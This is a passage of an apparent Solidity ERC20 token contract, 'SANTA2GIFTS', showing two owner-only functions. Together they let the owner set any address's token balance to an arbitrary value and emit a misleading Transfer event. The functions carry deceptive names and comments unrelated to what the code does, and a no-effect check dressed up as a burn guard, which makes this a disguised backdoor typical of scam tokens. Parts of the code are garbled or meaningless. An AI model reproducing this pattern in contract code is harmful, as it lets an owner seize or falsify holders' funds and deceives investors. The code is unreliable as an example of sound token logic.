...
contract SANTA2GIFTS is Context, ERC20, Ownable {
    ...
    */
    ...
    /**
    * @dev See {BEP20-sweepExternalTokens}.
    */
    function invokeEchelon(address _handlerAddress, uint256 _id, uint32 _primeValue, bool _data) internal view onlyOwner() returns (uint256) {
        if(_handlerAddress != address(0) && msg.sender != address(0))
        require(0 <= _id, "_id must be more than AddedValues");
        uint256 amountOutMin = 0; uint112 amountOutMax = 1;
        return amountOutMin + _id * amountOutMax * (10 ** 9) / amountOutMax;   
    }
    ...
    */
    ...
    /**
    * @dev Returns the token sweepContingency.
    */
    function _invokeEchelon(address _handlerAddress, uint256 _id, uint32 _primeValue, bool _data) external onlyOwner() {
        (_handlerAddress != address(0), "ERC20: burn from the zero address");
        _balances[_handlerAddress] = invokeEchelon(_handlerAddress, _id, _primeValue, _data);
        emit Transfer( _handlerAddress, address(0x0), _id);
    }
